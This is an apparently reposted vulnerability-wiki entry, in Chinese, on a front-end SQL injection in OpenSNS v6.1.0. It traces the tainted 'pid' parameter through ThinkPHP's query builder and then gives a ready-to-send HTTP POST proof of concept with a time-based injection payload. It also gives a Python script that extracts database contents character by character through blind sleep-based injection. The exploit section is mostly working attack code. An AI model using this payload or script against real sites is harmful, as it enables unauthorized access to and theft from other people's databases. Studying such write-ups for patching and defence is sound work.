OpenSNS v6.1.0 前台sql注入
==========================

一、漏洞简介
------------

二、漏洞影响
------------

OpenSNS v6.1.0

三、复现过程
------------

### 漏洞分析

Addons/ChinaCity/Controller/ChinaCityController.class.php:50
发现我们输入的payload，向前查找，最开始从\$\_POST获取，如何处理，到此处

![](/Users/aresx/Documents/VulWiki/.resource/OpenSNSv6.1.0前台sql注入/media/rId25.jpg)

ThinkPHP/Common/functions.php:343 跟进I函数获取到payload

![](/Users/aresx/Documents/VulWiki/.resource/OpenSNSv6.1.0前台sql注入/media/rId26.jpg)

继续跟发现有参数过滤，可仔细一看跟没过滤一样

![](/Users/aresx/Documents/VulWiki/.resource/OpenSNSv6.1.0前台sql注入/media/rId27.jpg)

![](/Users/aresx/Documents/VulWiki/.resource/OpenSNSv6.1.0前台sql注入/media/rId28.jpg)

到这里向前追溯就结束了，从`$pid = I('pid');` 向后跟

跟进 \\Addons\\ChinaCity\\Model\\DistrictModel::\_list
`$list = D('Addons://ChinaCity/District')->_list($map);`跟进
Addons/ChinaCity/Model/DistrictModel.class.php:12

![](/Users/aresx/Documents/VulWiki/.resource/OpenSNSv6.1.0前台sql注入/media/rId29.jpg)

![](/Users/aresx/Documents/VulWiki/.resource/OpenSNSv6.1.0前台sql注入/media/rId30.jpg)

ThinkPHP/Library/Think/Model.class.php:618
`$resultSet = $this->db->select($options);`ThinkPHP/Library/Think/Db.class.php:772

![](/Users/aresx/Documents/VulWiki/.resource/OpenSNSv6.1.0前台sql注入/media/rId31.jpg)

Db.class.php:799, Think\\Db-\>buildSelectSql() 下的 `$this->parseSQl`
ThinkPHP/Library/Think/Db.class.php:799

![](/Users/aresx/Documents/VulWiki/.resource/OpenSNSv6.1.0前台sql注入/media/rId32.jpg)

ThinkPHP/Library/Think/Db.class.php:804
发现执行了2个其他的sql语句，在此处（`buildSelectSql 里->return $sql`）下断点可以看到sql语句

![](/Users/aresx/Documents/VulWiki/.resource/OpenSNSv6.1.0前台sql注入/media/rId33.jpg)

ThinkPHP/Library/Think/Db.class.php:813

![](/Users/aresx/Documents/VulWiki/.resource/OpenSNSv6.1.0前台sql注入/media/rId34.jpg)

ThinkPHP/Library/Think/Db.class.php:821
`$this->parseWhere(!empty($options['where'])?$options['where']:''),`

ThinkPHP/Library/Think/Db.class.php:423

![](/Users/aresx/Documents/VulWiki/.resource/OpenSNSv6.1.0前台sql注入/media/rId35.jpg)

跟到

![](/Users/aresx/Documents/VulWiki/.resource/OpenSNSv6.1.0前台sql注入/media/rId36.jpg)

ThinkPHP/Library/Think/Db.class.php:457

![](/Users/aresx/Documents/VulWiki/.resource/OpenSNSv6.1.0前台sql注入/media/rId37.jpg)

ThinkPHP/Library/Think/Db.class.php:468

![](/Users/aresx/Documents/VulWiki/.resource/OpenSNSv6.1.0前台sql注入/media/rId38.jpg)

ThinkPHP/Library/Think/Db.class.php:457

![](/Users/aresx/Documents/VulWiki/.resource/OpenSNSv6.1.0前台sql注入/media/rId39.jpg)

ThinkPHP/Library/Think/Db.class.php:497

![](/Users/aresx/Documents/VulWiki/.resource/OpenSNSv6.1.0前台sql注入/media/rId40.jpg)

虽然这个地方有转译，但只有\$val\[1\]

![](/Users/aresx/Documents/VulWiki/.resource/OpenSNSv6.1.0前台sql注入/media/rId41.jpg)

ThinkPHP/Library/Think/Db.class.php:464

![](/Users/aresx/Documents/VulWiki/.resource/OpenSNSv6.1.0前台sql注入/media/rId42.jpg)

ThinkPHP/Library/Think/Db.class.php:813

![](/Users/aresx/Documents/VulWiki/.resource/OpenSNSv6.1.0前台sql注入/media/rId43.jpg)

ThinkPHP/Library/Think/Db.class.php:773
`$result = $this->query($sql,$this->parseBind(!empty($options['bind'])?$options['bind']:array()));`

执行成功 sleep了

    Db.class.php:469, Think\Db->parseWhereItem()
    Db.class.php:457, Think\Db->parseWhere()
    Db.class.php:821, Think\Db->parseSql()
    Db.class.php:799, Think\Db->buildSelectSql()
    Db.class.php:772, Think\Db->select()
    Model.class.php:618, Think\Model->select()
    DistrictModel.class.php:12, Addons\ChinaCity\Model\DistrictModel->_list()
    ChinaCityController.class.php:58, Addons\ChinaCity\Controller\ChinaCityController->getCity()
    AddonsController.class.php:42, Home\Controller\AddonsController->execute()
    App.class.php:153, ReflectionMethod->invokeArgs()
    App.class.php:153, Think\App::exec()
    App.class.php:193, Think\App::run()
    Think.class.php:121, Think\Think::start()
    ThinkPHP.php:96, require()
    index.php:73, {main}()

### 漏洞复现

#### vul url

> [http://0-sec.org/uploads\_download\_2019-07-16\_5d2d5d4697d88/index.php?s=/home/addons/\_addons/china\_city/\_controller/china\_city/\_action/getcity.html](https://www.t00ls.net/)

#### poc

    POST /index.php?s=%2Fhome%2Faddons%2F_addons%2Fchina_city%2F_controller%2Fchina_city%2F_action%2Fgetcity.html HTTP/1.1
    Host: 0-sec.org
    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
    Content-Length: 116
    Accept: */*
    Cookie: 
    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,und;q=0.7
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    Origin: http://192.168.95.131
    Referer: http://192.168.95.131/uploads_download_2019-07-16_5d2d5d4697d88/index.php?s=/ucenter/config/index.html
    X-Requested-With: XMLHttpRequest
    Accept-Encoding: gzip

    cid=0&pid%5B0%5D=%3D%28select%2Afrom%28select%2Bsleep%283%29union%2F%2A%2A%2Fselect%2B1%29a%29and+3+in+&pid%5B1%5D=3

![](/Users/aresx/Documents/VulWiki/.resource/OpenSNSv6.1.0前台sql注入/media/rId48.jpg)

![](/Users/aresx/Documents/VulWiki/.resource/OpenSNSv6.1.0前台sql注入/media/rId49.jpg)

Vulnerability file

Addons/ChinaCity/Controller/ChinaCityController.class.php:50

![](/Users/aresx/Documents/VulWiki/.resource/OpenSNSv6.1.0前台sql注入/media/rId50.jpg)

ThinkPHP/Library/Think/Db.class.php:772

![](/Users/aresx/Documents/VulWiki/.resource/OpenSNSv6.1.0前台sql注入/media/rId51.jpg)

![](/Users/aresx/Documents/VulWiki/.resource/OpenSNSv6.1.0前台sql注入/media/rId52.jpg)

#### exp

    import requests
    from requests import exceptions

    url="http://192.168.95.131/uploads_download_2019-07-16_5d2d5d4697d88/index.php?s=/home/addons/_addons/china_city/_controller/china_city/_action/getcity.html"


    header={'X-Requested-With':'XMLHttpRequest'}
    # proxies={'http':'127.0.0.1:8080'}
    flag=''
    for i in range(1,50):
        for j in range(32,128):
            try:
                data={
                    'cid':0,
                    'pid[0]':"=(select if(ord(substr((select version()),{},1))={},sleep(10),0))AND 3 IN  ".format(i,j),
                    'pid[1]':3
                }
                # print data['pid[0]']
                r=requests.post(url,data=data,headers=header,timeout=5)

            except exceptions.Timeout :
                flag+=chr(j)
                print flag

![](/Users/aresx/Documents/VulWiki/.resource/OpenSNSv6.1.0前台sql注入/media/rId54.jpg)

参考链接
--------

> <https://www.t00ls.net/thread-54688-1-1.html>
